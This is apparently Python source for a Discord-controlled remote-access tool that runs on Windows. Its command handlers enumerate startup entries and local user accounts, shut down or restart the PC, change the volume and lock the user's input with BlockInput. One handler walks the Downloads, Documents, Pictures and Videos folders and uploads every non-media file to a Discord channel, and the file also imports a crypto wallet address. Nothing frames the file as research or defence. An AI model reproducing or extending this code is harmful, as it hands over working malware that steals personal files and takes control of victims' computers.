import random,string,subprocess,os,discord,shutil,winreg,io, asyncio, sys, ctypes, threading, win32net, psutil
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from co.config import CRYPTO_ADDRESS
async def list_startup_apps(ctx):
 startup_apps=[]
 registry_paths=[
  r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
  r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
  r'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
  r'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
 ]
 for path in registry_paths:
  try:
   with winreg.OpenKey(winreg.HKEY_CURRENT_USER,path) as key:
    for i in range(winreg.QueryInfoKey(key)[1]):
     app_name,app_value,_=winreg.EnumValue(key,i)
     startup_apps.append((app_name,app_value))
  except FileNotFoundError:
   continue
  try:
   with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path) as key:
    for i in range(winreg.QueryInfoKey(key)[1]):
     app_name,app_value,_=winreg.EnumValue(key,i)
     startup_apps.append((app_name,app_value))
  except FileNotFoundError:
   continue
 user_startup=os.path.join(os.path.expanduser("~"),"AppData","Roaming","Microsoft","Windows","Start Menu","Programs","Startup")
 all_users_startup=os.path.join("C:\\ProgramData","Microsoft","Windows","Start Menu","Programs","Startup")
 for path in [user_startup,all_users_startup]:
  if os.path.exists(path):
   for filename in os.listdir(path):
    full_path=os.path.join(path,filename)
    startup_apps.append((filename,full_path))
 if not startup_apps:
  await ctx.send("No startup applications found.")
 else:
  startup_info='\n'.join([f"{name}: {path}"for name,path in startup_apps])
  file=io.StringIO(startup_info)
  file.seek(0)
  await ctx.send("**Startup Applications:**",file=discord.File(file,'startup.txt'))
async def reload_command(ctx):
    await ctx.send("Restarting in 2 seconds...")
    main_file_path=os.path.abspath(sys.argv[0])
    subprocess.Popen([sys.executable,main_file_path])
    await asyncio.sleep(2)
    os.kill(os.getpid(),os.SIGTERM)  
async def restartpc(ctx):
    os.system("shutdown /r /t 0")
    await ctx.send("The PC will restart now.")
async def vol_command(ctx, volume: int):
    if 1 <= volume <= 100:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_control = cast(interface, POINTER(IAudioEndpointVolume))
        volume_level = volume / 100.0
        volume_control.SetMasterVolumeLevelScalar(volume_level, None)
        await ctx.send(f"Volume set to **{volume}**%.")
    else:
        await ctx.send("Please provide a volume level between **1** and **100**.")    
async def shutdownpc(ctx):
    os.system("shutdown /s /t 0")
    await ctx.send("The PC will shut down now.")
async def getfiles(ctx):
 root_directories = [os.path.expanduser("~/Downloads"),os.path.expanduser("~/Documents"),os.path.expanduser("~/Pictures"),os.path.expanduser("~/Videos")]
 errors = set()
 excluded_extensions = {'.exe','.dll','.mp3','.wav','.mp4','.avi','.mov','.png','.jpg','.jpeg','.gif','.bmp'}
 channel_name = f"files-{ctx.channel.name}"
 existing_channel = discord.utils.get(ctx.guild.channels,name=channel_name)
 if not existing_channel:
  overwrites = {ctx.guild.default_role:discord.PermissionOverwrite(send_messages=False),ctx.author:discord.PermissionOverwrite(send_messages=True)}
  new_channel = await ctx.guild.create_text_channel(channel_name,overwrites=overwrites)
 else:
  new_channel = existing_channel
 for root_dir in root_directories:
  for root,_,files in os.walk(root_dir):
   for file_name in files:
    if os.path.splitext(file_name)[1].lower() not in excluded_extensions:
     file_path = os.path.join(root,file_name)
     try:
      file_to_send = discord.File(file_path)
      await new_channel.send(file=file_to_send)
     except Exception as e:
      if file_path not in errors:
       errors.add(file_path)
       print(f"Skipping {file_path}: {e}")
blocking = False
def is_admin(): 
 try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
 except: return False
def block_input(): 
 ctypes.windll.user32.BlockInput(True)
 while blocking: pass
async def nomouse_command(ctx, action: str):
 global blocking
 if not is_admin(): await ctx.send("This command requires admin privileges. Please run the bot as an administrator."); return
 if action.lower() not in ['start', 'stop']: await ctx.send("Invalid action. Use `start` or `stop`."); return
 if action.lower() == 'start':
  if blocking: await ctx.send("Mouse input is already blocked.")
  else:
   blocking = True
   threading.Thread(target=block_input, daemon=True).start()
   await ctx.send("Mouse input is now blocked.")
 elif action.lower() == 'stop':
  if blocking: 
   blocking = False
   ctypes.windll.user32.BlockInput(False)
   await ctx.send("Mouse input is now unblocked.")
  else: await ctx.send("Mouse input is not currently blocked.")                       
async def listusers(ctx):
    await ctx.send(embed=discord.Embed(title="System Users", description="\n".join([user['name'] for user in win32net.NetUserEnum(None, 0)[0]]) or "No users found", color=discord.Color.blue()))